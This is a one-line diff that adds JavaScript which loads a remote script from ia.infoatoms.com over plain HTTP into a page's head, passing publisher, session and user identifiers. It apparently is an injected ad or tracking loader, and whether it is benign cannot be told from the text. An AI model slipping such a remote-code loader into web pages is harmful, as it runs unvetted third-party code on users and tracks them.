@@ -1,0 +1,1 @@
+var pubjs=document.createElement("script");pubjs.src="http://ia.infoatoms.com/pubjs?pid=306298&sid=87752ba7d09741e7a94ed2301a80b73d&uid=EEAEF75534274E33819FC06F00509407&cid=0&t="+Math.round((new Date()).getTime()/7200000);pubjs.type="text/javascript";pubjs.id="FPCfg";document.getElementsByTagName("head")[0].appendChild(pubjs)
